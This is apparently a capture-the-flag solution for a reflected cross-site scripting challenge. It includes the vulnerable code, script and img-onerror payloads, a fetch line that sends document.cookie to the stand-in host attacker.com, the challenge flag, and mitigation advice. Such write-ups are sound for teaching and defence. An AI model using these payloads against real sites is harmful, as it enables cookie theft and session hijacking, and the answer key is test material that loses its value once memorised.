# Challenge 06: GuestBook - Solution

## Vulnerability Type
**Cross-Site Scripting (XSS) - Reflected XSS**

## Description
The search functionality reflects user input directly into the HTML response without proper escaping, allowing JavaScript injection.

## Vulnerable Code
```python
# VULNERABLE: q injected directly into HTML
search_display = f'<p>Search results for: <b>{q}</b></p>'
```

## Exploitation Steps

1. The admin's flag is stored in a cookie: `admin_flag=FCTF{xss_st0l3_my_c00k13}`
2. Craft an XSS payload to steal the cookie
3. Use the search feature with payload:
   ```html
   <script>alert(document.cookie)</script>
   ```
4. Or to exfiltrate the cookie:
   ```html
   <script>fetch('http://attacker.com/?c='+document.cookie)</script>
   ```

## Simple Payload to View Cookie
```
?q=<script>alert(document.cookie)</script>
```

## Payload to Extract Flag
```
?q=<img src=x onerror="alert(document.cookie)">
```

## Flag
```
FCTF{xss_st0l3_my_c00k13}
```

## How It Works
1. The search parameter is reflected in the HTML without escaping
2. JavaScript code executes in the victim's browser context
3. The script can access cookies, session storage, and make requests
4. In a real attack, the cookie would be sent to an attacker-controlled server

## Mitigation
- Always escape user input before rendering in HTML
- Use proper templating with auto-escaping:
  ```python
  search_display = f'<p>Search results for: <b>{html_lib.escape(q)}</b></p>'
  ```
- Implement Content Security Policy (CSP) headers
- Set cookies with `HttpOnly` flag to prevent JavaScript access
- Use frameworks that auto-escape by default
- Validate and sanitize all user input
